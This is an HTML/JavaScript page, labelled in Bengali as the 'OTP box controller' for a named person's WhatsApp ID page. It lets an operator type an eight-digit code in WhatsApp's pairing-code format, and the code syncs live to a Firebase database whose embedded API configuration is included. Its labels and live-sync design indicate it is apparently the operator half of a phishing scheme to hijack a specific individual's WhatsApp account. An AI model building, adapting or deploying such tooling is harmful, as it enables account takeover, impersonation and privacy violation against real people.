<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>OTP কন্ট্রোল প্যানেল</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <style>
        body { 
            font-family: 'Kalpurush', sans-serif;
            background: linear-gradient(135deg, #1e3a8a, #312e81, #1e3a8a); /* Deep blue/purple gradient */
            color: #e5e7eb; 
        }
        .glass-card {
            background: rgba(17, 24, 39, 0.5); /* Semi-transparent dark background */
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .pin-inputs input {
            width: 60px; /* Increased width */
            height: 75px; /* Increased height */
            text-align: center;
            font-size: 2.5rem; /* Increased font size */
            font-weight: bold;
            background-color: rgba(0, 0, 0, 0.3);
            border: 2px solid #4b5563;
            color: #f9fafb;
            border-radius: 0.75rem; /* More rounded corners */
            margin: 0 0.3rem;
            transition: all 0.2s ease-in-out;
        }
        .pin-inputs input:focus { 
            border-color: #06b6d4; /* Bright cyan on focus */
            outline: none; 
            transform: scale(1.1);
            box-shadow: 0 0 20px rgba(6, 182, 212, 0.4);
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

<div class="glass-card p-8 rounded-2xl shadow-2xl text-center max-w-lg w-full">
    <h1 class="text-3xl font-bold mb-4 text-white flex items-center justify-center">
        <i class="fa fa-keyboard mr-3 text-cyan-400"></i>
        নুসরাত জাহান হোয়াটসঅ্যাপ আইডির পেজ টির ওটিপি box কন্ট্রোলার
    </h1>
    <p class="mb-8 text-gray-400">এখানে কোড টাইপ করুন, এটি লাইভ আপডেট হবে।</p>
    
    <div id="pinContainer" class="flex flex-wrap justify-center items-center pin-inputs">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <span class="text-4xl mx-2 self-center text-gray-500">-</span>
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
        <input type="text" maxlength="1">
    </div>
</div>

<!-- Firebase SDK (v8) -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
    // আপনার দেওয়া Firebase configuration কোড
    const firebaseConfig = {
      apiKey: "AIzaSyA--EbKHCyRtTp4AgBZua22Ad2J7JRbS28",
      authDomain: "control-my-page.firebaseapp.com",
      databaseURL: "https://control-my-page-default-rtdb.firebaseio.com",
      projectId: "control-my-page",
      storageBucket: "control-my-page.appspot.com",
      messagingSenderId: "846756179295",
      appId: "1:846756179295:web:f5eec02565c2f2d45c5aea",
      measurementId: "G-37RH0B37KK"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const pinInputs = document.querySelectorAll('#pinContainer input');

    function updateFirebase() {
        const code = [...pinInputs].map(input => input.value).join('');
        database.ref('liveCode').set({
            code: code.padEnd(8, ' ')
        });
    }

    pinInputs.forEach((input, index) => {
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value === '') {
                if (index > 0) {
                    pinInputs[index - 1].focus();
                }
            }
        });

        input.addEventListener('input', () => {
            if (input.value) {
                if (index < pinInputs.length - 1) {
                    pinInputs[index + 1].focus();
                }
            }
            updateFirebase();
        });
    });
</script>

</body>
</html>
